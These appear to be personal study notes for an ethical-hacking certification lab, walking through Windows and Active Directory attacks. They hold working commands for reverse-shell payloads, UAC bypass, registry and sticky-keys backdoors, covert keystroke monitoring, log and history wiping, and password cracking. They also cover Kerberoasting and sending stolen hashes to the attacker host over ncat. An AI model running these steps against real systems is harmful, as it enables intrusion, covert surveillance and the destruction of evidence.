# System Hacking

exploiting for gaining access to the systems to steal or misuse the data/information

## gaining access

tool used
#### [[Responder]]
#tool/linux 

```bash
sudo responder -I eth0
```
> -I = specifies the interface
> > here eth0 

> by default, responder stores the logs in /usr/share/responder/logs

→ copy the hash of the user and save it in a .txt file
> then we will use [[john]] to crack the hash
```bash
john hash.txt
```
> can be any file name in which the has is been stored


## reverse shell generator

#docker  #gui #tool/linux 

```bash
docker run -d -p 80:80 reverse_shell_generator
```

> if an error pops us `service apache2 stop` → rerun above command

→ firefox → http://localhost
→ IP field → <target-IP'>
→ port 4444
→ create the command in `msfvenom`
→ in the listener tab change the type to `msfconsole`
→ copy both commands and run in separate terminals
→ an .exe file will be created
→ now we need to transfer this .exe file to the target computer
→ as soon as the .exe file runs in the target pc, we will gain access to the computer

we can do the same with other scripts.
next we are using a PowerShell script

→ `Hoaxshell` tab in the reverse shell generator tab
→ select `PowerShell IEX`
→ in this we change the port to `444`
→ copy the payload and save it in a .ps1 file - *this is our payload that we need to run on the target machine*
→ change the listener type to `hoaxshell`

→ in the target pc use PowerShell to run the .ps1 file

## Buffer Overflow (tbc)
---
tools used
#### Immunity Debugger
---

## Privilege Escalation

2 types
1. horizontal 
2. vertical

tool used 
#### [[Metasploit]]

### By bypassing UAC and Exploiting Sticky Keys

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
```
> here
> > lport (local-port)=444 (change accordingly)
> > lhost (local-host)=10.10.1.13 (change accordingly)
> this creates a reverse shell .exe file payload

```bash
msfconsole
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost <10.10.1.13>
```
> change accordingly
```
set lport 444
```
> change accordingly
```
run
```

→ the .exe file when runs on the target machine
→ we get the shell on our terminal
→ perform `sysinfo` and `getuid` - to obtain computer name, OS, domains and current user ID

- background
- search bypassuac
- use exploit/windows/local/bypassuac_fodhelper
- set session 1
- show options
- set LHOST 10.10.1.3
- set TARGET 0
> 0 indicates nothing, but the Exploit Target ID

- exploit
- getsystem -t 1
- getuid
- background
- use post /windows/manage/sticky_keys
- sessions -i*
> lists the sessions in meterpreter

set session 2
exploit

→ login as a non admin account
→ lock the screen
→ press the `shift` button 5 times
→ instead of sticky kets popup, you'll get a cmd prompt
→ whoami
> privilege escalated


### Maintaining remote access

#### spyrix 
#tool/windows  #website 

covert monitoring of user activities in real-time
> can be used to user system monitoring and surveillance

→ install the spyrix on the target machine
→ open the account listed during the setup on a website in the local computer
→ from here u can maintain and monitor your target system
> u can view 
> > 1. live view of the target system
> > 2. keyboard strokes casptured
> > 3. screen shots of the machine taken by spyrix
> > 4. web pages visited by the target
> 
> u can also generate reports directly from the website by clicking `Reports` on the left pane in the dashboard

### persistence by **Modifying Registry Keys**

tool used
#### [[Metasploit]]

```bash
msfconsole -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/test.exe
```
> this is to create a reverse shell .exe payload

```bash
msfconsole -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
```
> this will create a payload that we'll upload into the run registry  of windows machine

```bash
msfconsole
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost <10.10.1.13>
```
> change accordingly
```
set lport 444
```
> change accordingly
```
run
```

→ run the test.exe file on target windows machine

- getuid
- background
> in this we will bypass UAC via SilentCleanup task present in the Windows task Scheduler
> present in the metasploit as `bypassuac_silentcleanup`

```
use exploit/windows/local/bypassuac_silentcleanup
```

- set session 1
- show options
- set LHOST 10.10.1.13
- set TARGET 0
> 0 indicates nothing, but the Exploit Target ID

exploit
> if an error occurs saying `Exploit completed, but no sessoin was created` 
> type `exploit` again

getsystem -t 1
getuid
> the meterpreter session is now running with system privileges

→ now we add the registry.exe to the registry to maintain persistent control over the target

```
shell
```
> this will give us a shell on the target machine
> 

in the elevated shell type :
```
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
```
> once the command is successful
> we need to open a metasploit listener in another tab

```bash
msfconsole
```
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost <10.10.1.13>
```
> change accordingly
```
set lport 4444
```
> change accordingly
```
run
```

→ on windows - restart the machine to place the file in the `Run Registry`
> as soon as the admin logins again with the acc
> we will get the shell on the metasploit listener
> a meterpreter session will be opened

> ```
> getuid
> ```
> results may show that the reverse shell is open with admin privileges


## clearing logs

techniques to clear the evidence of security compromise ⇒
1. disable auditing 
2. clearing logs
3. manipulating logs
4. covering tracks on the network
5. covering tracks on the OS
6. deleting files
7. disabling windows functionality

### clearing windows machine logs

#### Clear_Event_Viewer_Logs.bat
#tool/windows 

> it is a utility that can be used to wipe out the logs of target system.
> run through PowerShell

#### [[wevtutil]]
#tool/windows 

> wevtutil is a command-line utility used to retrieve information about event logs and publishers. 
> 
> You can also use this command to 
> > 1. install and uninstall event manifests
> > 2. run queries
> > 3. export, archive, and clear logs.

→ open `cmd` with admin privileges
```
wevtutil el
```
> el OR enum-logs = lists event logs

```
wevtutil cl <log-name>
```
> cl OR clear-log = clears a log\
> log name can be obtained from previous command
> > eg. - application, security, system etc.

#### [[cipher]]
#tool/windows 

> Cipher.exe is an in-built Windows command-line tool that can be used to securely delete a chunk of data by overwriting it to prevent its possible recovery. 
> This command also assists in encrypting and decrypting data in NTFS partitions.
> To avoid data recovery and to cover their tracks, attackers use the Cipher.exe tool to overwrite the deleted files.


```
cipher /w:<drive or folder or file location>
```
> more the size , more the time taken to overwrite

### clearing logs in linux / BASH 

```bash
export HISTSIZE=0
```

> to clear stored history
> ```bash
> history -c
> ```

> to clear the history of the current shell only, leaving other shells untouched
> ```bash
> history -w
> ```

> to shred the history file making it impossible to read

```bash
shred ~/.bash_history
```

or use all the above commands in a single command

```bash
shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit
```
> This command first shreds the history file, then deletes it, and finally clears the evidence of using this command. After this command, you will exit from the terminal window.


## AD attacks using various tools

### scan to identify the DC IP 
DC IP = Domain Controller IP

tool used
#### [[nmap]]

```bash
nmap 10.10.1.0/24
```
> scans the entire network 

> observe the output correctly and look for an IP that has 2 main ports open
> > port 88 / kerberos-sec
> > port 389 / LDAP 
> 
> **the one with both of these open shows that host is the DC**

now scan that host specially
```bash
nmap -sC -A -sV <DC-IP>
```
> this will provide us with the domain name of the system
> > generally located beneath `smb-os-discovery`

### AS-REP Roasting Attack

```bash
cd impacket/examples
```

```bash
python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22
```
> GetNPUsers.py = script name
> CEH.com = domain name aqcuired in the previous step
> -no-pass = flag to find user accounts not requiring pre-authentication
> -usersfile = /path/to/file with username list
> -dc-ip = ip address of the DC

copy the hash of the user that has **DONT_REQUIRE_PREAUTH**

save it in a file hash.txt

now we crack the hash using [[john]]

```bash
john --wordlist=/root/ADtools/rockyou.txt hash.txt
```
> --wordlist = define the /path/to/filename where the wordlist is stored

### Password Spraying

#### CrackMapExec

```bash
cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
```
> -u = /path/to/file - username wordlist
> -p = password to be sprayed
> rdp = protocol to be targetted

from the list is someone uses the same password itll be cracked and the ip address od the user will be shown
try connecting to the ip address
→ open `remmina`
→ fill out the details extracted
→ try to connect to the client

### Post-Enumeration 

#### PowerView

> it is a PowerShell tool designed for network and AD enumeration

→ transfer the PowerView.ps1 file to the target computer
→ to achieve this we can
> host a server and download it on the target computer

here we are hosting a simple [[portable python server]]
```bash
python3 -m http.server 80
```
> u can specify the port at the end
> defaults to 8000

go to any browser on the target machine (connected via rdp here during the previous phase)
```
http://10.10.1.13:80
```

→ download the file 
→ open PowerShell 
```
cd Downloads
```
```
PowerShell -EP bypass
```
```
. .\PowerView.ps1
```
> this loads the powerview script in the PowerShell

not we get much more commands to enumerate further

- Get-NetComputer - displays all the information related to computers in AD
- Get-NetGroup - lists all groups in AD
- Get-NetUser - retrieves detailed info about the AD users such as
	- usernames
	- groups
	- memberships

> in the lab we see a user named *SQL_srv* who has some higher privileges
> so we will be attacking this further

more such commands to enumerate are
- Get-NetOU - lists the organizational units 
- Get-NetSession - lists active sessions 
- Get-NetLoggedon - lists user currently logged on
- Get-NetProcess - lists processes running on domain machines
- Get-NetDomainTrust - domain trusts relationships
- Get-NetServices - services running on domain machines
- Get-NetObjectACL - retrieves ACLs for a specified object
- Get-NetSPN - service principal names (SPN) in the domain
- Find-InterestingDomainACL - finds Interesting ACLs 
- Invoke-ShareFinder - find shared folders in the domain
- Invoke-Sharehunter - find where domain admins are logged in
- Invoke-CheckLocalAdminAccess - checks if the current suer has local admin access on specifed machines


### Perform MSSQL attack

> in the previous lab we saw that a user named **SQL_srv** had admin rights and was running sql services
> also the device was located in IP - 10.10.1.30
> has port 1433 open (mssql services)

so we attempt to bruteforce the password 

tool used
#### [[CEH-Tools/hydra]]
#tool/linux 

→ save the name SQL_srv in a .txt file names user.txt
```bash
hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
```
> -L = specifies the username list
> -P = specifies the passwords list
> mssql is the service we are attempting to bruteforce
> > here the results show that the password is batman

we try to log into the service
```bash
python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433 
```

> note down the name of the database
> > here `master`

> we will attempt to find out if the [[xp_cmdshell]] is misconfigured or not

execute into the shell obtained from python script
```
SELECT name, CONVERT(INT, ISNULL(value. value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell'
```
> if this returns 1, it indicates that the xp_cmdshell is enabled on the server

we will now attempt to exploit this xp_cmshell

```bash
msfconsole
```
- use exploit/windows/mssql/mssql_payload
- set RHOST 10.10.1.30
- set USERNAME SQL-srv
- set PASSWORD batman
- set DATABASE master
- exploit

→ after doing all this we get a meterpreter session
```
shell
```
```
whoami
```

### privilege escalation 
#### WinPeas.exe

→ continue in the above shell
> we need to transfer the WinPeas.exe to the targeted machine

```
cd C:\Users\Public\Downloads
```
```
powershell
```

→ host a [[portable python server]] in the `/root/ADtools` directory

in the compromised shell
```
wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe
```
```
./winpeas.exe
```

→ look for an unquoted service
> here we see that a `file.exe` in `C:\Program Files\CEH services` has unquoted and can be exploited

→ in a new terminal
```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
```

back in the compromised shell
```
cd ../../.. ; cd "Program Files/CEH services"
```
```
move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe
```

in another terminal we will open a netcat listener
```bash
nc -nlvp 8888
```
> port number same as when creating the payload via msfvenom

→ now as soon as the victim *SQL_srv* logs on the computer
→ we will gain its shell

```
whoami
```
> and we can see that we are logged in as the user *SQL_srv*

### Perform Kerberoasting

in the netcat shell obtained in the last attack

```
powershell
```
```
cd ../.. ; cd Users\Public\Downloads
```
 we need to download 2 more executables
```
wget http://10.10.1.13:8000 Rubeus.exe -o rebeus.exe
```
```
wget http://10.10.1.13:8000 ncat.exe -o ncat.exe
```

```
exit
```
```
cd ../.. ; cd Users\Public\Downloads
```

```
rubeus.exe kerberoast /outfile:hash.txt
```
> after kerberoasting the hash of the DC Admin will be saved in hash.txt

now we need to move this hash.txt file to the attacker machine

in another terminal
```
nc -lvp 9999 > hash.txt
```

in the compromised shell
```
ncat.exe -w 10.10.1.13 9999 < hash.txt
```

→ in the netcat listener shell press `Enter`
> this will save the hash in the file

now we will crack the hash using [[hashcat]]

```bash
hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
```

 > -m 13100: This specifies the hash type. 13100 corresponds to Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), a specific format for Kerberos hashes.
 > --force: This option forces Hashcat to ignore warnings and run even if there are compatibility issues. *Use this with caution, as it might cause instability or incorrect results.*
 > -a 0: This specifies the attack mode. 0 stands for a straight attack, which is a simple dictionary attack where Hashcat tries each password in the dictionary as it is.
 > hash.txt: is the input file containing the hashes to crack
 > /root/ADtools/rockyou.txt: is the wordlist file used for the attack
 
→ we crack the password and then as a DC-admin has high privileges we can use this to attack further if we want


to perform SSH-bruteforce using [[Hydra]]
```bash
hydra -L <path/to/username-list> -P <path/to/password-list> ssh://<target-ip> 
```


---
